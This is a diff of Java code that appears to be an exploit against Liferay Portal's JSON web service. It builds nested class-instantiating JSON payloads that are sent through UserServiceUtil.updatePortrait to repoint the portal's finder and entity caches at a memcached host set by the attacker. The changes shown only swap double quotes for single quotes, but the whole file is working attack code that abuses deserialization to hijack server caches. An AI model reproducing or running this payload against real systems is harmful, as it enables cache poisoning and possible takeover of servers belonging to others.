@@ -138,40 +138,40 @@ public class Main {
 
         String binaryConnectionFactory =
                 "{" +
-                    "\"class\":\"net.spy.memcached.BinaryConnectionFactory\"" +
+                    "'class':'net.spy.memcached.BinaryConnectionFactory'" +
                 "}";
 
         String memcachedClientFactory = String.format(
                 "{" +
-                    "\"class\":\"com.liferay.portal.cache.memcached.DefaultMemcachedClientFactory\"," +
-                    "\"connectionFactory\":" + binaryConnectionFactory + "," +
-                    "\"addresses\":[\"%s:%d\"]" +
+                    "'class':'com.liferay.portal.cache.memcached.DefaultMemcachedClientFactory'," +
+                    "'connectionFactory':" + binaryConnectionFactory + "," +
+                    "'addresses':['%s:%d']" +
                 "}", MEMCACHE_SERVER_HOST, MEMCACHE_SERVER_PORT);
 
         String portalCacheManager =
                 "{" +
-                    "\"class\":\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager\"," +
-                    "\"timeout\":20," +
-                    "\"timeoutTimeUnit\":\"SECONDS\"," +
-                    "\"memcachedClientPool\":" + memcachedClientFactory +
+                    "'class':'com.liferay.portal.cache.memcached.MemcachePortalCacheManager'," +
+                    "'timeout':20," +
+                    "'timeoutTimeUnit':'SECONDS'," +
+                    "'memcachedClientPool':" + memcachedClientFactory +
                 "}";
 
         String multiVMPool =
                 "{" +
-                    "\"class\":\"com.liferay.portal.cache.MultiVMPoolImpl\"," +
-                    "\"portalCacheManager\":" + portalCacheManager +
+                    "'class':'com.liferay.portal.cache.MultiVMPoolImpl'," +
+                    "'portalCacheManager':" + portalCacheManager +
                 "}";
 
         String finderCache =
                 "{" +
-                    "\"class\":\"com.liferay.portal.dao.orm.common.FinderCacheImpl\"," +
-                    "\"multiVMPool\":" + multiVMPool +
+                    "'class':'com.liferay.portal.dao.orm.common.FinderCacheImpl'," +
+                    "'multiVMPool':" + multiVMPool +
                 "}";
 
         String util =
                 "{" +
-                    "\"class\":\"com.liferay.portal.kernel.dao.orm.FinderCacheUtil\"," +
-                    "\"finderCache\":" + finderCache +
+                    "'class':'com.liferay.portal.kernel.dao.orm.FinderCacheUtil'," +
+                    "'finderCache':" + finderCache +
                 "}";
 
         UrlBuilder urlBuilder = UrlBuilder.createUrl(String.format("http://%s:%d/c/portal/json_service",
@@ -179,7 +179,7 @@ public class Main {
 
         urlBuilder.addParameter("serviceClassName", "com.liferay.portal.service.UserServiceUtil");
         urlBuilder.addParameter("serviceMethodName", "updatePortrait");
-        urlBuilder.addParameter("serviceParameters", "[\"userId\",\"bytes\"]");
+        urlBuilder.addParameter("serviceParameters", "['userId','bytes']");
         urlBuilder.addParameter("userId", "1");
         urlBuilder.addParameter("bytes", util);
 
@@ -195,39 +195,39 @@ public class Main {
 
     private static void reconfigureEntityCache() throws IOException {
 
-        String binaryConnectionFactory = "{\"class\":\"net.spy.memcached.BinaryConnectionFactory\"}";
+        String binaryConnectionFactory = "{'class':'net.spy.memcached.BinaryConnectionFactory'}";
 
         String memcachedClientFactory = String.format(
                 "{" +
-                        "\"class\":\"com.liferay.portal.cache.memcached.DefaultMemcachedClientFactory\"," +
-                        "\"connectionFactory\":" + binaryConnectionFactory + "," +
-                        "\"addresses\":[\"%s:%d\"]" +
+                    "'class':'com.liferay.portal.cache.memcached.DefaultMemcachedClientFactory'," +
+                    "'connectionFactory':" + binaryConnectionFactory + "," +
+                    "'addresses':['%s:%d']" +
                 "}", MEMCACHE_SERVER_HOST, MEMCACHE_SERVER_PORT);
 
         String portalCacheManager =
                 "{" +
-                        "\"class\":\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager\"," +
-                        "\"timeout\":20," +
-                        "\"timeoutTimeUnit\":\"SECONDS\"," +
-                        "\"memcachedClientPool\":" + memcachedClientFactory +
+                    "'class':'com.liferay.portal.cache.memcached.MemcachePortalCacheManager'," +
+                    "'timeout':20," +
+                    "'timeoutTimeUnit':'SECONDS'," +
+                    "'memcachedClientPool':" + memcachedClientFactory +
                 "}";
 
         String multiVMPool =
                 "{" +
-                        "\"class\":\"com.liferay.portal.cache.MultiVMPoolImpl\"," +
-                        "\"portalCacheManager\":" + portalCacheManager +
+                    "'class':'com.liferay.portal.cache.MultiVMPoolImpl'," +
+                    "'portalCacheManager':" + portalCacheManager +
                 "}";
 
         String entityCache =
                 "{" +
-                        "\"class\":\"com.liferay.portal.dao.orm.common.EntityCacheImpl\"," +
-                        "\"multiVMPool\":" + multiVMPool +
+                    "'class':'com.liferay.portal.dao.orm.common.EntityCacheImpl'," +
+                    "'multiVMPool':" + multiVMPool +
                 "}";
 
         String util =
                 "{" +
-                        "\"class\":\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\"," +
-                        "\"entityCache\":" + entityCache +
+                    "'class':'com.liferay.portal.kernel.dao.orm.EntityCacheUtil'," +
+                    "'entityCache':" + entityCache +
                 "}";
 
         UrlBuilder urlBuilder = UrlBuilder.createUrl(String.format("http://%s:%d/c/portal/json_service",
@@ -235,7 +235,7 @@ public class Main {
 
         urlBuilder.addParameter("serviceClassName", "com.liferay.portal.service.UserServiceUtil");
         urlBuilder.addParameter("serviceMethodName", "updatePortrait");
-        urlBuilder.addParameter("serviceParameters", "[\"userId\",\"bytes\"]");
+        urlBuilder.addParameter("serviceParameters", "['userId','bytes']");
         urlBuilder.addParameter("userId", "1");
         urlBuilder.addParameter("bytes", util);
 
